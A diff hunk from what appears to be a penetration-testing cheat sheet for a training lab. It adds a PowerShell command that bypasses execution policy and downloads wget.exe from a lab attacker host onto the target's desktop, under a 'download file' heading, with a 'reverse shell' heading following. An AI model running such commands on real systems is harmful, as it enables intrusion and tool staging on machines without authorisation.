@@ -55,6 +55,7 @@ dir (Get-Module -ListAvailable FlagModule).ModuleBase
 
 ### download file
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell -nop -Exec Bypass -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"  
 
 ### reverse shell
 ```
